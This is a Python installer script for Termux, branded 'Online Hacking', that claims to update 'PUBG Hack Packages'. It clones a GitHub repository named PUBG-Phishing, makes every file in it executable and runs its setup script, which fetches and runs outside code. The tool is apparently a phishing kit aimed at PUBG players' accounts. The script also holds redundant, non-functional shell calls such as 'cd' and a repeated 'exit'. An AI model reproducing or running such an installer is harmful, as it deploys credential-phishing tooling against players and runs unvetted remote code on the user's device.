#!/usr/bin/python3
import os
import time
import sys

os.system("clear")

print('''\033[91m
   ____  _    _    ____            _      
  / __ \| |  | |  |  _ \          (_)     
 | |  | | |__| |  | |_) | __ _ ___ _  ___ 
 | |  | |  __  |  |  _ < / _` / __| |/ __|
 | |__| | |  | |  | |_) | (_| \__ \ | (__ 
  \____/|_|  |_|  |____/ \__,_|___/_|\___|  OnlineHacking (SUMAN) 
''')
def slowprint(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(5. / 100)

print (''' \033[95m
+--------------------------------------+
| This Tool Update PUBG Hack Packages  |
+--------------------------------------+
|       Coded By Online Hacking        |
+--------------------------------------+''')

slowprint(''' \033[93m
Pubg Tool Update ''')
slowprint('''\033[96m
This Command for access Storage in Termux
[00] termux-setup-storage''')
print ("                                            ")
choice = input("\033[93mDo You Want to Install All Packages [y/n] : ")
if choice == 'n' : sys.exit()
if choice == 'y' : os.system ("apt update")
os.system ("cd $HOME")
os.system ("rm -rf PUBG-Phishing")
os.system ("cd /data/data/com.termux/files/usr/bin")
os.system ("rm -rf onlinehacking-pubg phs")
os.system ("cd $HOME")
os.system ("git clone https://github.com/OnlineHacKing/PUBG-Phishing.git")
os.system ("cd PUBG-Phishing")
os.system ("chmod +x *")
os.system ("./setup")
os.system ("exit")
os.system ("exit")



print ("""
Subscribe Online Hacking """)


print ("Allow the Button For Access the Storage in Termux")


os.system ("termux-setup-storage")

def slowprint(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(8. / 100)
print("\033[95m+-------------------------------------------------+")
slowprint('''\033[95m|             Welcome To Online Hacking            |
|           Subscribe Our YouTube Channel         |
| Watch Ours Tutorials For Learn Ethical Hacking  |''')
print("+-------------------------------------------------+")

input("\n\nPress the enter key to exit : ")
